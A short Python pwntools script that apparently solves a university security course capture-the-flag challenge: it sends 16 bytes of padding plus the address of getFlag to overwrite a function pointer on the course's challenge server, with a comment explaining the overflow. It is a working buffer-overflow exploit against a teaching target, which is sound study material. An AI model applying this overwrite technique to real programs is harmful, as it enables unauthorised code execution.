#!/usr/bin/python3

from pwn import *
from pwn import p64

io = remote('inf226.puffling.no', 7001)

# 00000000004011d6 <getFlag> from objdump -d ./01
line = cyclic(16) + p64(0x4011d6)
io.sendline(line)


recieved = io.recvall().decode()
flag = recieved.splitlines()[-1]
print(f'Flag 01: {flag}')


'''
From the source code
The function getFlag surrenders the flag.
The structure vars contains a buffer of size 16,
as well as a function pointer which is initialized
not to point to any function.
By sending 16 bytes of junk along the address of
getFlag, we set the function pointer to this function,
which in turn returns our flag.
The address of getFlag is found though objdump in the
command line, or the visualization tool on 
https://inf226.puffling.no/frames/ with frames 01.
'''